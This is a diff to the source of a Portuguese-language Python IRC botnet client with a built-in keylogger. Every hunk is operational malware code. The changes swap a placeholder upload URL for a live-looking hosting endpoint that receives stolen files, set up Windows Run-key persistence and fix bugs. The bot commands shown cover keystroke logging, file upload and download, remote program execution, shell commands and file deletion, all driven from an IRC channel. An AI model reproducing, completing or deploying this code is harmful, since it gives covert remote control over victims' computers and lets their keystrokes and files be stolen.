@@ -2,10 +2,6 @@
 # -*-coding:utf-8-*-
 
 
-
-
-
-
 import glob                                       # Funcao listArq()
 import multiprocessing                            # Funcao Keylog()
 import os                                         # Funcoes deleteFile(), listArq(), upload(),
@@ -32,9 +28,9 @@ ircChanne= "#amarula4242"                                  # Canal ao qual o Zum
 ircPwdCha= "@nolimits42"                                   # Password do canal, caso nao haja, deixar em branco.
 botAdmi= "Papa Father"                                     # Nome que os Zumbis usarao para chamar voce (n. obrigatorio)
 botPass= "raise"                                           # Password para se conectar aos bots no canal
-urlUpload = "http://meusite.com/upload.php"                # Array PHP que ira receber os arquivos via upload
+urlUpload = "http://cardinal-restaurant.000webhostapp.com/upload.php"                # Array PHP que ira receber os arquivos via upload
 urlStrip = urlUpload.strip('http:upload.php')              # Exibe a URL do dos arquivos upados
-ldir = 'store'                                             # Pasta onde sera salvo o arquivo de log local no cliente
+ldir = os.getcwd()+'\storage'                                      # Pasta onde sera salvo o arquivo de log local no cliente
 window = None                                              # Funcao onKey(event) para capturar o nome da janela
 data = ''                                                  # Funcao onKey(event) para tratar os dados capturados
 head = ''                                                  # Para definir o cabecalho da janela capturada no log.txt
@@ -44,7 +40,7 @@ pcname = platform.node()                                   # Nome do PC
 pcos = platform.platform()                                 # Nome do OS
 pcprocess = platform.processor()                           # Descricao do Processador
 fileup = ldir + '\capt-' + pcname + '.txt'                 # Auxiliar da funcao upload2(fileup)
-
+botNick = pcname + "-" + str(random.randint(1, 10000))     # Nick do bot no IRC
 # --------------------------------------------------------------------------------------------------------------------#
 #                                        F U N C O E S   O P E R A C I O N A I S                                      #
 # --------------------------------------------------------------------------------------------------------------------#
@@ -100,7 +96,7 @@ def getPublicIp():
 # Obtem o IP publico do zumbi
 
 	dataIp = str(urlopen('http://checkip.dyndns.com/').read())
-	return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(Ip).group(1)
+	return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(dataIp).group(1)
 
 def ipLocal():
 # Obtem o IP local do zumbi
@@ -111,28 +107,30 @@ def ipLocal():
 def keylog():
 # Funcao principal do keylogger
 
-    try:
-        os.mkdir(ldir)
+	global ldir
 
-    except Exception as e:
-        print 'Excecao:', e
-        pass
+	try:
+		os.mkdir(ldir)
+
+	except Exception as e:
+		print 'Excecao:', e
+		pass
 
 
-    file = open(ldir + '\capt-' + pcname + '.txt', 'a')
-    file.write('\n[+]'+('-'*64+'[+]\n'))
-    file.write('   AbaCatch Keylogger v1.0\n   _Ora, ora, parece que temos um xeroque rolmes aqui_\n\n')
-    file.write('   DATA E HORA: ' + date + '\n')
-    file.write('   NOME DO USUARIO: ' + pcname + '\n')
-    file.write('   SISTEMA OPERACIONAL: ' + pcos + '\n')
-    file.write('   PROCESSADOR: ' + pcprocess + '\n')
-    file.write('[+]' + ('-'*64 + '[+]\n'))
-    file.close()
+	file = open(ldir + '\capt-' + pcname + '.txt', 'a')
+	file.write('\n[+]'+('-'*64+'[+]\n'))
+	file.write('   AbaCatch Keylogger v1.0\n   _Ora, ora, parece que temos um xeroque rolmes aqui_\n\n')
+	file.write('   DATA E HORA: ' + date + '\n')
+	file.write('   NOME DO USUARIO: ' + pcname + '\n')
+	file.write('   SISTEMA OPERACIONAL: ' + pcos + '\n')
+	file.write('   PROCESSADOR: ' + pcprocess + '\n')
+	file.write('[+]' + ('-'*64 + '[+]\n'))
+	file.close()
 
-    hooks_manager = pyHook.HookManager()
-    hooks_manager.KeyDown = onkey
-    hooks_manager.HookKeyboard()
-    pythoncom.PumpMessages()
+	hooks_manager = pyHook.HookManager()
+	hooks_manager.KeyDown = onkey
+	hooks_manager.HookKeyboard()
+	pythoncom.PumpMessages()
 
 def listArq():
 # Lista os arquivos do diretorio atual
@@ -188,7 +186,7 @@ def persis():
 
 	try:
 		conv = os.path.realpath(__file__).replace('.py', '.exe')
-		subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Amarula" /t REG_SZ /F /D '+conv, shell=True)
+		subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Amarula /t REG_SZ /f /d '+conv, shell=True)
 		EnviaMsg(ircChanne, "[+] Registro alterado com sucesso [+]")
 	except:
 		EnviaMsg(ircChanne, "[+] Nao foi possivel alterar o registro [+]")
@@ -284,13 +282,12 @@ def quitIrc(chan):
 def main():
 #Funcao Principal
 
-	global botAdmi, dir, comando, ircSock, botNick, fileUp, urlDown, fileRun, interval, delFile, outt, out2, out3
+	global botAdmi, ldir, comando, ircSock, botNick, fileUp, urlDown, fileRun, interval, delFile, outt, out2, out3
 
-	pcName = platform.node()
 	ircSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	botNick = pcName + "-" + str(random.randint(1, 10000))
-	#time.sleep(40) # Wait Initialization of the network card - Uncomment the line
-
+	#time.sleep(40) # Esperar a inicializacao do network card (uncomment to use)
+	print ldir
+	print type(ldir)
 	conn()
 	join(ircChanne)
 	login = False
@@ -325,7 +322,7 @@ def main():
 			ircSock.send(str.encode("NICK "+ botNick +"\n"))
 			join(ircChanne)
 
-		elif ircMsg.find(str.encode("keylog start")) != -1: # Command to get the host IP
+		elif ircMsg.find(str.encode("keylog start")) != -1:
 			try:
 				p = ircMsgClean.split()
 				id = p[5]
@@ -338,7 +335,7 @@ def main():
 					pr.start()
 					EnviaMsg(ircChanne, "[+] Iniciando Keylogger [+]")
 
-		elif ircMsg.find(str.encode("keylog stop")) != -1: # Command to get the host IP
+		elif ircMsg.find(str.encode("keylog stop")) != -1:
 			try:
 				p = ircMsgClean.split()
 				id = p[5]
@@ -353,14 +350,14 @@ def main():
 		elif ircMsg.find(str.encode("PING :")) != -1:
 			ping()
 
-		elif ircMsg.find(str.encode("sair")) != -1: # Command used for the bot leave the channel, but remains connected to the irc server
+		elif ircMsg.find(str.encode("sair")) != -1:
 			leaveChannel(ircChanne)
 
-		elif ircMsg.find(str.encode("matar")) != -1: # Command used for kill bot on irc server
+		elif ircMsg.find(str.encode("matar")) != -1:
 			quitIrc(ircChanne)
 			sys.exit()
 
-		elif ircMsg.find(str.encode("help")) != -1: # Command used to display help for the user
+		elif ircMsg.find(str.encode("help")) != -1:
 			try:
 				p = ircMsgClean.split()
 				id = p[4]
@@ -370,36 +367,36 @@ def main():
 				if id == botNick:
 					EnviaMsg(ircChanne, "[+] Bem Vindo, Mestre " + botAdmi + " [+]")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [matar]    para matar os bots ativos")
+					EnviaMsg(ircChanne, "use: [matar]         para matar os bots ativos")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [sair]     para que os bots ativos saiam do canal")
+					EnviaMsg(ircChanne, "use: [sair]          para que os bots ativos saiam do canal")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [dir]      para vizualizar o diretorio atual do zumbi")
+					EnviaMsg(ircChanne, "use: [dir]           para vizualizar o diretorio atual do zumbi")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [ls]       para listar o conteudo da pasta atual")
+					EnviaMsg(ircChanne, "use: [ls]            para listar o conteudo da pasta atual")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [ip]       para mostrar os ips do bot")
+					EnviaMsg(ircChanne, "use: [ip]            para mostrar os ips do bot")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [upload]   para fazer upload de arquivos do bot")
+					EnviaMsg(ircChanne, "use: [upload]        para fazer upload de arquivos do bot")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [download] para baixar arquivos para o zumbi")
+					EnviaMsg(ircChanne, "use: [download]      para baixar arquivos para o zumbi")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [run]      para executar um programa")
+					EnviaMsg(ircChanne, "use: [run]           para executar um programa")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [shell]    para executar comandos no terminal")
+					EnviaMsg(ircChanne, "use: [shell]         para executar comandos no terminal")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [delete]   para excluir arquivos")
+					EnviaMsg(ircChanne, "use: [delete]        para excluir arquivos")
 					time.sleep(1)
-					EnviaMsg(ircChanne, "use: [start keylog]   para ativar o keylogger")
+					EnviaMsg(ircChanne, "use: [start keylog]  para ativar o keylogger")
 					time.sleep(1)
 					EnviaMsg(ircChanne, "use: [stop keylog]   para desativar o keylogger")
 					time.sleep(1)
 					EnviaMsg(ircChanne, "use: [persistence]   para instalar persistencia no registro do Windows")
 
-		elif ircMsg.find(str.encode("botnick")) != -1: # Command to get bot nickname
+		elif ircMsg.find(str.encode("botnick")) != -1:
 			EnviaMsg(ircChanne, "Nickname: " + botNick)
 
-		elif ircMsg.find(str.encode("dir")) != -1: # Command to list the current directory of the bot
+		elif ircMsg.find(str.encode("dir")) != -1:
 			try:
 				p = ircMsgClean.split()
 				id = p[4]
@@ -409,7 +406,7 @@ def main():
 				if id == botNick:
 					EnviaMsg(ircChanne, "[+] Diretorio atual do zumbi: " + os.getcwd())
 
-		elif ircMsg.find(str.encode("ls")) != -1: # Command to list the files in the current directory
+		elif ircMsg.find(str.encode("ls")) != -1:
 			try:
 				p = ircMsgClean.split()
 				id = p[4]
@@ -419,7 +416,7 @@ def main():
 				if id == botNick:
 					listArq()
 
-		elif ircMsg.find(str.encode("ip")) != -1: # Command to get the host IP
+		elif ircMsg.find(str.encode("ip")) != -1:
 			try:
 				p = ircMsgClean.split()
 				id = p[4]
@@ -431,7 +428,7 @@ def main():
 					xy = ipLocal()
 					EnviaMsg(ircChanne, "IP Local: " + str(xy) +  " Ip Externo: " + "['" + yx + "']"  )
 
-		elif ircMsg.find(str.encode("upload")) != -1: # Command to upload files
+		elif ircMsg.find(str.encode("upload")) != -1:
 			try:
 				p = ircMsgClean.split()
 				fileUp = p[4]
@@ -443,7 +440,7 @@ def main():
 					EnviaMsg(ircChanne, "[+] Upload em andamento, aguarde um pouco. [+]")
 					upload()
 
-		elif ircMsg.find(str.encode("download")) != -1: # Command to download files to the host
+		elif ircMsg.find(str.encode("download")) != -1:
 			try:
 				p = ircMsgClean.split()
 				urlDown = p[4]
@@ -454,7 +451,7 @@ def main():
 				if urlDown == urlDown and id == botNick:
 					download()
 
-		elif ircMsg.find(str.encode("run")) != -1: # Command to execute files on the host
+		elif ircMsg.find(str.encode("run")) != -1:
 			try:
 				p = ircMsgClean.split()
 				fileRun = p[4]
@@ -465,7 +462,7 @@ def main():
 				if fileRun == fileRun and id == botNick:
 					run()
 
-		elif ircMsg.find(str.encode("delete")) != -1: # Command to delete files
+		elif ircMsg.find(str.encode("delete")) != -1:
 			try:
 				p = ircMsgClean.split()
 				delFile = p[4]
@@ -476,7 +473,7 @@ def main():
 				if delFile == delFile and id == botNick:
 					deleteFile()
 
-		elif ircMsg.find(str.encode("shell")) != -1:  # Command to execute files on the host
+		elif ircMsg.find(str.encode("shell")) != -1:
 			try:
 				p = ircMsgClean.split()
 				print (p)
